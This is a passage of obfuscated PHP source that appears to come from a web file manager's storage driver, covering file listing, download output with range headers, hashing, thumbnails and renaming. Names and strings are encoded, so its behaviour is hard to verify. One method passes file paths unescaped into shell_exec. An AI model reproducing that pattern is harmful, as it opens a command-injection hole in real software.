$áÉº‹®†[$Ô¼§«­Ò[76]]; } if (isset($áÉº‹®†[$Ô¼§«­Ò[85]])) { $üÖŠ•ö[$Ô¼§«­Ò[85]] = $áÉº‹®†[$Ô¼§«­Ò[85]]; } if (is_array($áÉº‹®†[$Ô¼§«­Ò[87]])) { $üÖŠ•ö[$Ô¼§«­Ò[86]] = $áÉº‹®†[$Ô¼§«­Ò[87]][$Ô¼§«­Ò[84]]; $üÖŠ•ö[$Ô¼§«­Ò[76]] = $áÉº‹®†[$Ô¼§«­Ò[87]][$Ô¼§«­Ò[76]]; $üÖŠ•ö[$Ô¼§«­Ò[85]] = $áÉº‹®†[$Ô¼§«­Ò[87]][$Ô¼§«­Ò[85]]; } else { if (substr($áÉº‹®†[$Ô¼§«­Ò[84]], 0, strlen($—­ç³†)) == $—­ç³†) { $üÖŠ•ö[$Ô¼§«­Ò[84]] = substr($áÉº‹®†[$Ô¼§«­Ò[84]], strlen($—­ç³†)); } } $û«ó¬÷™ = $áÉº‹®†[$Ô¼§«­Ò[75]] ? $Ô¼§«­Ò[8] : $Ô¼§«­Ò[12]; $üÖŠ•ö[$Ô¼§«­Ò[86]] = rtrim($üÖŠ•ö[$Ô¼§«­Ò[86]], $Ô¼§«­Ò[8]) . $û«ó¬÷™; $üÖŠ•ö[$Ô¼§«­Ò[84]] = $Ô¼§«­Ò[8] . trim($üÖŠ•ö[$Ô¼§«­Ò[84]], $Ô¼§«­Ò[8]) . $û«ó¬÷™; if (!$ŠÏòç ¬) { $Ó¤ì„™Õ = explode($Ô¼§«­Ò[8], trim($üÖŠ•ö[$Ô¼§«­Ò[84]], $Ô¼§«­Ò[8])); $üÖŠ•ö[$Ô¼§«­Ò[84]] = $Ô¼§«­Ò[8] . implode($Ô¼§«­Ò[8], array_slice($Ó¤ì„™Õ, 1)) . $û«ó¬÷™; } $ëıÇ™[] = $üÖŠ•ö; } return array_sort_by($ëıÇ™, $Ô¼§«­Ò[84]); } public function upload($û…¿ó¥ë, $÷Çãƒé, $âÆ¿¾‹ = false, $€²éÄÒó = REPEAT_REPLACE) { } public function uploadFileByID($Ü¥Ùá¶“, $ÛÀ‚½âÈ, $Á‹‡’¿ ) { } public function uploadFileByPath($ÇÓ§¾½³, $øêìŸÛµ, $ ÚÛ½œ = array()) { } public function isUploadServer() { $¤×•ÉÑæ =& $_SERVER[¡“ËÌ§œ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¤×•ÉÑæ[88]) { return !0; } return $GLOBALS[$¤×•ÉÑæ[6]][$¤×•ÉÑæ[89]][$¤×•ÉÑæ[90]]; } public function isFileOutServer() { $ğÆ½½½ë =& $_SERVER[¡“ËÌ§œ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ğÆ½½½ë[88]) { return !0; } return $GLOBALS[$ğÆ½½½ë[6]][$ğÆ½½½ë[89]][$ğÆ½½½ë[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($İÅõõ†÷) { $ªóŞà¨Ã =& $_SERVER[¡“ËÌ§œ]; if (!$this->isCdnHost()) { return $İÅõõ†÷; } return str_replace(trim(get_url_root($İÅõõ†÷), $ªóŞà¨Ã[8]), trim($this->cdnHost, $ªóŞà¨Ã[8]), $İÅõõ†÷); } public function uploadLink($¾Š›Ù×, $°Ï ¢öÕ = 0) { $­ÌÓîÎ± =& $_SERVER[¡“ËÌ§œ]; if ($this->isUploadServer()) { return; } $¶Ì´¤¯ş = $this->getType(); if (!in_array($¶Ì´¤¯ş, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $÷è†½Ÿò = 1024 * 1024 * 10; $¦Ñâ¾Ôâ = $°Ï ¢öÕ <= $÷è†½Ÿò ? $­ÌÓîÎ±[92] : $­ÌÓîÎ±[93]; $Æî®«¥Ö = (!$°Ï ¢öÕ ? 1 : ceil($°Ï ¢öÕ / pow(1024, 3))) * 3600 * 4; $Ÿ¥á‹È… = $this->{$¦Ñâ¾Ôâ}($¾Š›Ù×, $Æî®«¥Ö); if ($Ÿ¥á‹È…) { $Ÿ¥á‹È…[$­ÌÓîÎ±[94]] = $¾Š›Ù×; $Ÿ¥á‹È…[$­ÌÓîÎ±[95]] = $¶Ì´¤¯ş; } return $Ÿ¥á‹È…; } public function uploadFormData($öŠ¦´à³, $ºÄúÍ™× = 3600) { } public function multiUploadFormData($ıÑ·, $ÉÂÍ–Ùõ = 3600) { } public function download($ë”ÁòĞ¿, $ä²¼ë”Î) { } public function ext($‰…Ñ÷——) { $¬¥Ôóã =& $_SERVER[¡“ËÌ§œ]; if (strpos($‰…Ñ÷——, $¬¥Ôóã[8]) === -1) { $ê•ãœŠ• = $‰…Ñ÷——; } else { $ê•ãœŠ• = $this->pathThis($‰…Ñ÷——); } $«ÃÀŸ“ = $¬¥Ôóã[12]; if (strstr($ê•ãœŠ•, $¬¥Ôóã[10])) { $«ÃÀŸ“ = substr($ê•ãœŠ•, strrpos($ê•ãœŠ•, $¬¥Ôóã[10]) + 1); $«ÃÀŸ“ = strtolower($«ÃÀŸ“); } if (strlen($«ÃÀŸ“) > 3 && preg_match($¬¥Ôóã[96], $«ÃÀŸ“, $İ¦…³Ë–)) { $«ÃÀŸ“ = $¬¥Ôóã[12]; } return $«ÃÀŸ“; } public function pathThis($š´ÎûÛ‡) { $óö¦Íåù =& $_SERVER[¡“ËÌ§œ]; $š´ÎûÛ‡ = str_replace($óö¦Íåù[97], $óö¦Íåù[8], rtrim($š´ÎûÛ‡, $óö¦Íåù[8])); $ÕËÚÙ’ª = strrpos($š´ÎûÛ‡, $óö¦Íåù[8]); if ($ÕËÚÙ’ª === !1) { return $š´ÎûÛ‡; } return substr($š´ÎûÛ‡, $ÕËÚÙ’ª + 1); } public function pathFather($Èñ¡·ŠŠ) { $ÃÄ«ì =& $_SERVER[¡“ËÌ§œ]; $Èñ¡·ŠŠ = str_replace($ÃÄ«ì[97], $ÃÄ«ì[8], rtrim($Èñ¡·ŠŠ, $ÃÄ«ì[8])); $êÂĞÚØ· = strrpos($Èñ¡·ŠŠ, $ÃÄ«ì[8]); if ($êÂĞÚØ· === !1) { return $ÃÄ«ì[12]; } return substr($Èñ¡·ŠŠ, 0, $êÂĞÚØ· + 1); } public function hashSimple($ã±œé¡¬) { $ŸÎ¿æ =& $_SERVER[¡“ËÌ§œ]; if (!$ã±œé¡¬) { return md5($ŸÎ¿æ[12]); } $ÁãıĞ”­ = $this->size($ã±œé¡¬); $²ÉöÃ¿ = 200; $Äƒ£¿ñ» = 50; if ($ÁãıĞ”­ <= $²ÉöÃ¿ * $Äƒ£¿ñ») { return $this->hashMd5($ã±œé¡¬) . $ÁãıĞ”­; } $áÜ™ïº = intval($ÁãıĞ”­ / $Äƒ£¿ñ»); $¹ôåäˆ“ = $ŸÎ¿æ[12]; for ($‰ø˜ŸÉÜ = 0; $‰ø˜ŸÉÜ < $Äƒ£¿ñ»; $‰ø˜ŸÉÜ++) { $¹ôåäˆ“ .= $this->fileSubstr($ã±œé¡¬, $áÜ™ïº * $‰ø˜ŸÉÜ, $²ÉöÃ¿); } $¹ôåäˆ“ .= $this->fileSubstr($ã±œé¡¬, $ÁãıĞ”­ - $²ÉöÃ¿, $²ÉöÃ¿); return md5($¹ôåäˆ“) . $ÁãıĞ”­; } public static $md5Cache = array(); public function hashMd5($Ù•„—Å¤) { if (!$Ù•„—Å¤) { return md5($_SERVER[¡“ËÌ§œ][12]); } $Ù•„—Å¤ = $this->iconvSystem($Ù•„—Å¤); if (isset(self::$md5Cache[$Ù•„—Å¤])) { return self::$md5Cache[$Ù•„—Å¤]; } self::$md5Cache[$Ù•„—Å¤] = $this->hashMd5Shell($Ù•„—Å¤); if (!self::$md5Cache[$Ù•„—Å¤]) { self::$md5Cache[$Ù•„—Å¤] = @md5_file($Ù•„—Å¤); } return self::$md5Cache[$Ù•„—Å¤]; } private function hashMd5Shell($Ùêìùİ) { $º¨‚æ¦ƒ =& $_SERVER[¡“ËÌ§œ]; if (!$Ùêìùİ) { return md5($º¨‚æ¦ƒ[12]); } if (!function_exists($º¨‚æ¦ƒ[98])) { return !1; } $×—ª´åµ = array($º¨‚æ¦ƒ[99], $º¨‚æ¦ƒ[100]); $šŸı™°÷ = Cache::get($º¨‚æ¦ƒ[101]); if (!$šŸı™°÷) { $şŞÜƒú = BASIC_PATH . $º¨‚æ¦ƒ[102]; $…ßú½òš = md5_file($şŞÜƒú); $šŸı™°÷ = $º¨‚æ¦ƒ[103]; foreach ($×—ª´åµ as $òì£ËÁ) { $À™†¦‰ê = shell_exec($òì£ËÁ . "\40\42{$şŞÜƒú}\42"); if ($À™†¦‰ê && substr(trim($À™†¦‰ê), 0, 32) == $…ßú½òš) { $šŸı™°÷ = $òì£ËÁ; break; } } Cache::set($º¨‚æ¦ƒ[101], $šŸı™°÷, 3600); } if ($šŸı™°÷ == $º¨‚æ¦ƒ[103]) { return !1; } $À™†¦‰ê = shell_exec($šŸı™°÷ . "\x20\42{$Ùêìùİ}\x22"); $À™†¦‰ê = str_replace($º¨‚æ¦ƒ[104], $º¨‚æ¦ƒ[12], $À™†¦‰ê); return substr($À™†¦‰ê, 0, 32); } public function link($òÌ»Ä¯) { return $òÌ»Ä¯; } public function fileOut($œçÏÛâ, $¨´½óÂ = false, $í´¹™¦ = false, $Ô­ˆÚÒ„ = '') { $®×ÈÌ© =& $_SERVER[¡“ËÌ§œ]; $this->cacheMethod(null, null); if (!$œçÏÛâ || !$this->exist($œçÏÛâ)) { show_json(LNG($®×ÈÌ©[105]), !1, $í´¹™¦); } $£Õ¡±ç’ = $this->getType() == $®×ÈÌ©[106]; $½‹¸‹• = $GLOBALS[$®×ÈÌ©[6]][$®×ÈÌ©[89]][$®×ÈÌ©[107]][$®×ÈÌ©[108]]; $îûâÜú = (double) $GLOBALS[$®×ÈÌ©[6]][$®×ÈÌ©[89]][$®×ÈÌ©[107]][$®×ÈÌ©[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $€İëü = $this->infoFull($œçÏÛâ); $Ÿ£¶ÒŠ = $€İëü[$®×ÈÌ©[76]]; $ÉÁÑõıŸ = gmdate($®×ÈÌ©[110], $€İëü[$®×ÈÌ©[85]]); $»Œëğ¶¶ = $í´¹™¦ ? $í´¹™¦ : $this->iconvApp($€İëü[$®×ÈÌ©[32]]); $»ê’‰ûÀ = 0; $ÒçÈ©« = $Ÿ£¶ÒŠ - 1; $¾¾Õ’î„ = $this->ext($»Œëğ¶¶); if (in_array($¾¾Õ’î„, array($®×ÈÌ©[111], $®×ÈÌ©[112], $®×ÈÌ©[113], $®×ÈÌ©[114]))) { $¾¾Õ’î„ = $®×ÈÌ©[115]; } if (in_array($¾¾Õ’î„, array($®×ÈÌ©[116]))) { $¾¾Õ’î„ = $®×ÈÌ©[117]; } if (!$Ô­ˆÚÒ„) { $Ô­ˆÚÒ„ = md5($ÉÁÑõıŸ . $this->hashSimple($œçÏÛâ)); } $Ô­ˆÚÒ„ = $®×ÈÌ©[118] . $Ô­ˆÚÒ„ . $®×ÈÌ©[118]; $ÇÄ ËÑ¾ = get_file_mime($¾¾Õ’î„); $³‹ü€ä² = !0; $³‹ü€ä² = isset($_GET[$®×ÈÌ©[119]]) ? !1 : !0; if ($¨´½óÂ === !1 && !mime_support($ÇÄ ËÑ¾)) { $ÇÄ ËÑ¾ = $®×ÈÌ©[120]; } header($®×ÈÌ©[121]); header($®×ÈÌ©[122] . $ÇÄ ËÑ¾); $ÃÄÀú¼ø = rawurlencode($»Œëğ¶¶); $ÃÄÀú¼ø = $®×ÈÌ©[118] . $ÃÄÀú¼ø . $®×ÈÌ©[123] . $ÃÄÀú¼ø; if ($¨´½óÂ) { header($®×ÈÌ©[124]); header($®×ÈÌ©[125] . $ÃÄÀú¼ø); } else { if ($³‹ü€ä²) { header($®×ÈÌ©[126] . $ÃÄÀú¼ø); } } header($®×ÈÌ©[127] . gmdate($®×ÈÌ©[110], time() + 3600 * 24 * 30) . $®×ÈÌ©[128]); header($®×ÈÌ©[129]); header($®×ÈÌ©[130]); header($®×ÈÌ©[131]); if (isset($_SERVER[$®×ÈÌ©[132]]) && strtotime($_SERVER[$®×ÈÌ©[132]]) == $€İëü[$®×ÈÌ©[85]]) { header($®×ÈÌ©[133], !0, 304); die; } if (isset($_SERVER[$®×ÈÌ©[134]]) && $_SERVER[$®×ÈÌ©[134]] == $Ô­ˆÚÒ„) { header($®×ÈÌ©[135] . $Ô­ˆÚÒ„, !0, 304); die; } header($®×ÈÌ©[135] . $Ô­ˆÚÒ„); header($®×ÈÌ©[136] . $ÉÁÑõıŸ . $®×ÈÌ©[128]); header($®×ÈÌ©[137] . $»Œëğ¶¶); header($®×ÈÌ©[138]); header($®×ÈÌ©[139] . $Ÿ£¶ÒŠ); header($®×ÈÌ©[140]); if (!$¨´½óÂ && $¾¾Õ’î„ == $®×ÈÌ©[141]) { if ($Ÿ£¶ÒŠ > 1024 * 1024 * 5) { die; } $‚–¿˜¨ = $this->getContent($œçÏÛâ); $‚–¿˜¨ = Html::clearSVG($‚–¿˜¨); header($®×ÈÌ©[142] . strlen($‚–¿˜¨)); echo $‚–¿˜¨; die; } $ê±ñĞœæ = strtolower($_SERVER[$®×ÈÌ©[143]]); if ($£Õ¡±ç’ && $ê±ñĞœæ && $½‹¸‹•) { if (strstr($ê±ñĞœæ, $®×ÈÌ©[144])) { header($®×ÈÌ©[145] . $œçÏÛâ); } else { if (strstr($ê±ñĞœæ, $®×ÈÌ©[146])) { header($®×ÈÌ©[147] . $œçÏÛâ); } else { if (strstr($ê±ñĞœæ, $®×ÈÌ©[148])) { header($®×ÈÌ©[149] . $œçÏÛâ); } } } if ($îûâÜú) { header($®×ÈÌ©[150] . $îûâÜú); } return; } if (isset($_SERVER[$®×ÈÌ©[151]])) { if (preg_match($®×ÈÌ©[152], $_SERVER[$®×ÈÌ©[151]], $‹Ò†û„ö)) { $»ê’‰ûÀ = intval($‹Ò†û„ö[1]); $»ê’‰ûÀ = $»ê’‰ûÀ <= 0 ? 0 : ($»ê’‰ûÀ >= $ÒçÈ©« ? $ÒçÈ©« : $»ê’‰ûÀ); if (!empty($‹Ò†û„ö[2])) { $²ªí´Æ½ = intval($‹Ò†û„ö[2]); $ÒçÈ©« = $²ªí´Æ½ < $»ê’‰ûÀ ? $»ê’‰ûÀ : ($²ªí´Æ½ >= $ÒçÈ©« ? $ÒçÈ©« : $²ªí´Æ½); } } header($®×ÈÌ©[153]); header("\103\x6f\x6e\164\x65\156\164\x2d\x52\141\156\147\145\72\40\142\171\164\x65\x73\x20{$»ê’‰ûÀ}\55{$ÒçÈ©«}\57" . $Ÿ£¶ÒŠ); } else { header($®×ÈÌ©[154]); } header($®×ÈÌ©[155]); $÷íÖ÷Å¦ = !0; if ($_SERVER[$®×ÈÌ©[156]] == $®×ÈÌ©[157] && $Ÿ£¶ÒŠ > 1204 * 1024 * 1024 * 2) { $÷íÖ÷Å¦ = !1; } if ($÷íÖ÷Å¦) { header($®×ÈÌ©[158] . ($ÒçÈ©« - $»ê’‰ûÀ + 1)); } if ($_SERVER[$®×ÈÌ©[159]] == $®×ÈÌ©[160]) { return; } $‡´Ÿ‚›Ú = 1024 * 100; $ÇŞğÃ¡ = 0; if ($îûâÜú) { $ÇŞğÃ¡ = intval(1000 * 1000 * ($‡´Ÿ‚›Ú / $îûâÜú)); } while ($»ê’‰ûÀ <= $ÒçÈ©«) { $õƒÁÇîõ = timeFloat(); check_abort(); $ÙÃ„àÆ‡ = $ÒçÈ©« - $»ê’‰ûÀ + 1; if ($ÙÃ„àÆ‡ <= $‡´Ÿ‚›Ú) { $‡´Ÿ‚›Ú = $ÙÃ„àÆ‡; } echo $this->fileSubstr($œçÏÛâ, $»ê’‰ûÀ, $‡´Ÿ‚›Ú); $»ê’‰ûÀ += $‡´Ÿ‚›Ú; if ($‡´Ÿ‚›Ú == $ÙÃ„àÆ‡) { $»ê’‰ûÀ = $ÒçÈ©« + 1; } if ($ÇŞğÃ¡) { $í•Âù× = intval(1000 * 1000 * (timeFloat() - $õƒÁÇîõ)); $·ë³İü” = $ÇŞğÃ¡ - $í•Âù×; if ($·ë³İü” > 5) { usleep($·ë³İü”); } } } } public function fileOutServer($‡¬³Ğ—, $Œ¥Ö®½ = false, $Ğ¢Çã¨Š = false, $Û˜×àÑ† = '') { $this->fileOut($‡¬³Ğ—, $Œ¥Ö®½, $Ğ¢Çã¨Š, $Û˜×àÑ†); } public function fileOutLink($ëË“õ™¨) { header($_SERVER[¡“ËÌ§œ][161] . $ëË“õ™¨); die; } public function cacheMethod($È©—öÎ, $÷Ğ‡Û¸‹, $œœ‘ø× = null) { $¬ ÎŸ =& $_SERVER[¡“ËÌ§œ]; static $ØÁŒü·û = array(); $õØÔ¤Æí = $÷Ğ‡Û¸‹ ? ltrim($this->getPathOuter($÷Ğ‡Û¸‹), $¬ ÎŸ[8]) : $¬ ÎŸ[12]; $„¯ß½‹­ = $¬ ÎŸ[162] . $È©—öÎ . $¬ ÎŸ[163] . rtrim($õØÔ¤Æí, $¬ ÎŸ[8]); if (is_null($È©—öÎ)) { $ØÁŒü·û = array(); return; } if (is_null($÷Ğ‡Û¸‹)) { foreach ($ØÁŒü·û as $„¯ß½‹­ => $ˆñ‡ŒÖ†) { if (!strstr($„¯ß½‹­, $¬ ÎŸ[162] . $È©—öÎ . $¬ ÎŸ[164])) { continue; } unset($ØÁŒü·û[$„¯ß½‹­]); } return; } if (!is_null($œœ‘ø×)) { $ØÁŒü·û[$„¯ß½‹­] = $œœ‘ø×; return; } $Ô×®Î‡— = isset($ØÁŒü·û[$„¯ß½‹­]) ? $ØÁŒü·û[$„¯ß½‹­] : null; if (!is_null($Ô×®Î‡—)) { return $Ô×®Î‡—; } $Ô×®Î‡— = $this->{$È©—öÎ}($÷Ğ‡Û¸‹); $ØÁŒü·û[$„¯ß½‹­] = $Ô×®Î‡—; return $Ô×®Î‡—; } public function cacheMethodInfoSet($Èûûãùì, $Ùëš«›, $ã£Õüä = false) { $º‡’¥Ë =& $_SERVER[¡“ËÌ§œ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($º‡’¥Ë[165], $Èûûãùì, $Ùëš«›); $this->cacheMethod($º‡’¥Ë[166], $Èûûãùì, $Ùëš«› ? !1 : !0); if (is_array($ã£Õüä)) { $this->cacheMethod($º‡’¥Ë[167], $Èûûãùì, $ã£Õüä); } } public function fileOutImage($Øù‚, $•½¨Û›ã = 250) { $Ü×ÔÇúÚ =& $_SERVER[¡“ËÌ§œ]; set_timeout(); if (substr($Øù‚, 0, 4) == $Ü×ÔÇúÚ[148]) { $this->fileOutLink($Øù‚); } $¼·÷åèæ = $this->info($Øù‚); $¡ù€–†Ğ = $¼·÷åèæ[$Ü×ÔÇúÚ[32]]; $ĞÔùè€‹ = !1; if (isset($GLOBALS[$Ü×ÔÇúÚ[168]]) && $GLOBALS[$Ü×ÔÇúÚ[168]][$Ü×ÔÇúÚ[84]] == $¼·÷åèæ[$Ü×ÔÇúÚ[84]]) { $ğë“ÎÉí = $GLOBALS[$Ü×ÔÇúÚ[168]][$Ü×ÔÇúÚ[169]]; if (!$¼·÷åèæ[$Ü×ÔÇúÚ[170]]) { $¼·÷åèæ[$Ü×ÔÇúÚ[170]] = $GLOBALS[$Ü×ÔÇúÚ[168]]; } if (isset($ğë“ÎÉí[$Ü×ÔÇúÚ[171]])) { if ($ğë“ÎÉí[$Ü×ÔÇúÚ[171]] <= $•½¨Û›ã && $ğë“ÎÉí[$Ü×ÔÇúÚ[172]] <= $•½¨Û›ã) { $ĞÔùè€‹ = !0; } } $¡ù€–†Ğ = $¼·÷åèæ[$Ü×ÔÇúÚ[170]][$Ü×ÔÇúÚ[32]]; } if ($¼·÷åèæ[$Ü×ÔÇúÚ[76]] <= 1024 * 50 || $ĞÔùè€‹ || !function_exists($Ü×ÔÇúÚ[173]) || $¼·÷åèæ[$Ü×ÔÇúÚ[174]] == $Ü×ÔÇúÚ[175]) { return $this->fileOut($Øù‚, !1, $¡ù€–†Ğ); } if (isset($¼·÷åèæ[$Ü×ÔÇúÚ[170]][$Ü×ÔÇúÚ[176]])) { $ïõŞú¤“ = $¼·÷åèæ[$Ü×ÔÇúÚ[170]][$Ü×ÔÇúÚ[176]]; } else { if (isset($¼·÷åèæ[$Ü×ÔÇúÚ[170]][$Ü×ÔÇúÚ[177]])) { $ïõŞú¤“ = $¼·÷åèæ[$Ü×ÔÇúÚ[170]][$Ü×ÔÇúÚ[177]]; } } if (!$ïõŞú¤“) { $ïõŞú¤“ = md5("{$¼·÷åèæ[$Ü×ÔÇúÚ[32]]}\137{$¼·÷åèæ[$Ü×ÔÇúÚ[84]]}\137{$¼·÷åèæ[$Ü×ÔÇúÚ[76]]}\137{$•½¨Û›ã}"); } $¯©óŞ¯Ò = "{$ïõŞú¤“}\137{$•½¨Û›ã}\x2e\x70\156\x67"; if (!($ĞÀÚæÃÄ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Ü×ÔÇúÚ[178]))) { $È¿ä’±ú = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Ü×ÔÇúÚ[179]); } else { $È¿ä’±ú = KodIO::make($ĞÀÚæÃÄ); } if ($ĞÀÚæÃÄ = IO::fileNameExist($È¿ä’±ú, $¯©óŞ¯Ò)) { $èÖ—ËŞ³ = KodIO::make($ĞÀÚæÃÄ); return IO::fileOut($èÖ—ËŞ³, !1, $¡ù€–†Ğ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $èÖ—ËŞ³ = DATA_THUMB . $¯©óŞ¯Ò; del_file($èÖ—ËŞ³); if (!@file_exists($èÖ—ËŞ³)) { $—¡µèŠĞ = TEMP_FILES; if (!is_dir($—¡µèŠĞ)) { mk_dir($—¡µèŠĞ); } $¡Á§¿•é = $—¡µèŠĞ . $ïõŞú¤“ . $Ü×ÔÇúÚ[10] . $¼·÷åèæ[$Ü×ÔÇúÚ[174]]; if (!@file_exists($¡Á§¿•é)) { $¡Á§¿•é = $this->download($Øù‚, $¡Á§¿•é); } ImageThumb::createThumb($¡Á§¿•é, $èÖ—ËŞ³, $•½¨Û›ã, $•½¨Û›ã * 10); } if (!file_exists($èÖ—ËŞ³) || filesize($èÖ—ËŞ³) < 100) { return @file_exists($¡Á§¿•é) ? IO::fileOut($¡Á§¿•é) : $this->fileOut($Øù‚); } if (!($¯Ù¢Ü‘ = IO::move($èÖ—ËŞ³, $È¿ä’±ú))) { return IO::fileOut($èÖ—ËŞ³); } del_file($èÖ—ËŞ³); IO::fileOut($¯Ù¢Ü‘); } public function fileOutImageServer($¬æÓÈÊÒ, $Â‰·™İ = 250) { $this->fileOutImage($¬æÓÈÊÒ, $Â‰·™İ); } public function fileNameAuto($‘»ª‘€Æ, $¯ªù€ü, $Íı¥¹¬™ = REPEAT_RENAME, $È›×Ùå‰ = false) { $´ÀÇÏô¼ =& $_SERVER[¡“ËÌ§œ]; $îğ‚Ò—ƒ = $‘»ª‘€Æ === $´ÀÇÏô¼[12] ? $¯ªù€ü : rtrim($‘»ª‘€Æ, $´ÀÇÏô¼[8]) . $´ÀÇÏô¼[8] . $¯ªù€ü; if ($Íı¥¹¬™ == REPEAT_REPLACE || !$this->exist($îğ‚Ò—ƒ) || $È›×Ùå‰ && $Íı¥¹¬™ != REPEAT_RENAME_FOLDER) { return $¯ªù€ü; } if ($Íı¥¹¬™ == REPEAT_SKIP) { return !1; } $ıÃ­òÊÀ = $´ÀÇÏô¼[10] . get_path_ext($¯ªù€ü); $ıÃ­òÊÀ = $ıÃ­òÊÀ == $´ÀÇÏô¼[10] || $È›×Ùå‰ ? $´ÀÇÏô¼[12] : $ıÃ­òÊÀ; $ÓéæêÚ÷ = 1; $ãØŸ¯±Â = substr($¯ªù€ü, 0, strlen($¯ªù€ü) - strlen($ıÃ­òÊÀ)); $õåÛ‹Ã× = $ãØŸ¯±Â . "\x28{$ÓéæêÚ÷}\x29{$ıÃ­òÊÀ}"; while ($this->exist(rtrim($‘»ª‘€Æ, $´ÀÇÏô¼[8]) . $´ÀÇÏô¼[8] . $õåÛ‹Ã×)) { $õåÛ‹Ã× = $ãØŸ¯±Â . "\50{$ÓéæêÚ÷}\x29{$ıÃ­òÊÀ}"; $ÓéæêÚ÷++; } return $õåÛ‹Ã×; } private function fileNameAutoList($š¦Öö”ê, $‘åÚ×É¸, $Ãç¯±Øƒ = false) { $ÜƒåŸü‚ =& $_SERVER[¡“ËÌ§œ]; $úƒé©³À = $this->listPath($š¦Öö”ê, !0); $úƒé©³À = array_merge($úƒé©³À[$ÜƒåŸü‚[82]], $úƒé©³À[$ÜƒåŸü‚[83]]); $›æËÕôÅ = array_to_keyvalue($úƒé©³À, $ÜƒåŸü‚[12], $ÜƒåŸü‚[32]); $İãĞ–¤è = $ÜƒåŸü‚[10] . get_path_ext($‘åÚ×É¸); $İãĞ–¤è = $İãĞ–¤è == $ÜƒåŸü‚[10] || $Ãç¯±Øƒ ? $ÜƒåŸü‚[12] : $İãĞ–¤è; $öÅ†òó« = substr($‘åÚ×É¸, 0, strlen($‘åÚ×É¸) - strlen($İãĞ–¤è)); $œó–¨Ë = $öÅ†òó« . "\x28\x30\x29{$İãĞ–¤è}"; for ($ùÜ¡í¤ = 1; $ùÜ¡í¤ <= count($›æËÕôÅ) + 1; $ùÜ¡í¤++) { $œó–¨Ë = $öÅ†òó« . "\x28{$ùÜ¡í¤}\51{$İãĞ–¤è}"; if (!in_array_not_case($œó–¨Ë, $›æËÕôÅ)) { return $œó–¨Ë; } } return $œó–¨Ë; } public function listAllFiles($Ì„œ¡Õ, $à´á¶ç„) { $íÒ¾ÌÖê =& $_SERVER[¡“ËÌ§œ]; if (empty($à´á¶ç„)) { return array(); } $­²úÌş… = array_keys($à´á¶ç„); $ì’óØ«Ø = array(); $Ì„œ¡Õ = trim($Ì„œ¡Õ, $íÒ¾ÌÖê[8]); foreach ($à´á¶ç„ as $ã’âÍÊ´ => $Ú£½½Àä) { $¡ˆœ‹ş¬ = ltrim(substr(trim($ã’âÍÊ´, $íÒ¾ÌÖê[8]), strlen($Ì„œ¡Õ)), $íÒ¾ÌÖê[8]); if (substr($ã’âÍÊ´, -1) == $íÒ¾ÌÖê[8]) { $¡ˆœ‹ş¬ = rtrim($¡ˆœ‹ş¬, $íÒ¾ÌÖê[8]) . $íÒ¾ÌÖê[8]; } $ì’óØ«Ø = array_merge($ì’óØ«Ø, $this->slicePath($¡ˆœ‹ş¬)); } $ŒäØƒş¯ = array(); foreach (array_unique($ì’óØ«Ø) as $Ø«Ş‚—é) { $ƒ ¾â¹Ñ = array($íÒ¾ÌÖê[84] => $this->getPathOuter($íÒ¾ÌÖê[8] . $Ì„œ¡Õ . $íÒ¾ÌÖê[8] . $Ø«Ş‚—é), $íÒ¾ÌÖê[75] => 1, $íÒ¾ÌÖê[76] => 0); if (substr($Ø«Ş‚—é, -1) != $íÒ¾ÌÖê[8]) { $ƒ ¾â¹Ñ[$íÒ¾ÌÖê[75]] = 0; $ÀÑûÁœ„ = $this->getPath($Ì„œ¡Õ . $íÒ¾ÌÖê[8] . $Ø«Ş‚—é); if (isset($à´á¶ç„[$ÀÑûÁœ„])) { $½ˆö¥ù = $à´á¶ç„[$ÀÑûÁœ„]; if (isset($½ˆö¥ù[$íÒ¾ÌÖê[76]])) { $ƒ ¾â¹Ñ[$íÒ¾ÌÖê[76]] = intval($½ˆö¥ù[$íÒ¾ÌÖê[76]]); } if (isset($½ˆö¥ù[$íÒ¾ÌÖê[180]])) { $ƒ ¾â¹Ñ[$íÒ¾ÌÖê[85]] = intval($½ˆö¥ù[$íÒ¾ÌÖê[180]]); } } } $ŒäØƒş¯[] = $ƒ ¾â¹Ñ; } return $ŒäØƒş¯; } public function slicePath($‹èù°‘) { $’¨¯Æò =& $_SERVER[¡“ËÌ§œ]; $ôÉû»É¥ = explode($’¨¯Æò[8], trim($‹èù°‘, $’¨¯Æò[8])); $ùÄÉÔ©‹ = 0; do { ++$ùÄÉÔ©‹; $ÛÅÉÒ[] = implode($’¨¯Æò[8], array_slice($ôÉû»É¥, 0, $ùÄÉÔ©‹)) . $’¨¯Æò[8]; } while ($ùÄÉÔ©‹ < count($ôÉû»É¥)); $ÛÅÉÒ[count($ôÉû»É¥) - 1] = $‹èù°‘; return $ÛÅÉÒ; } public function getHost() { $¬â•÷¡Ñ =& $_SERVER[¡“ËÌ§œ]; $ÙîÙ®µ± = parse_url(trim($this->domain, $¬â•÷¡Ñ[8])); $Ê€µ„âÌ = isset($ÙîÙ®µ±[$¬â•÷¡Ñ[181]]) ? $ÙîÙ®µ±[$¬â•÷¡Ñ[181]] : http_type(); $ÇÆêæı¨ = isset($ÙîÙ®µ±[$¬â•÷¡Ñ[182]]) ? $ÙîÙ®µ±[$¬â•÷¡Ñ[182]] : $ÙîÙ®µ±[$¬â•÷¡Ñ[84]]; if (isset($ÙîÙ®µ±[$¬â•÷¡Ñ[183]])) { $ÇÆêæı¨ .= $¬â•÷¡Ñ[4] . $ÙîÙ®µ±[$¬â•÷¡Ñ[183]]; } return $Ê€µ„âÌ . $¬â•÷¡Ñ[184] . $ÇÆêæı¨; } public function pathEncode($´Ê¡…ı¬) { $úÆÙõš» =& $_SERVER[¡“ËÌ§œ]; return str_replace($úÆÙõš»[185], $úÆÙõš»[8], rawurlencode($´Ê¡…ı¬)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public 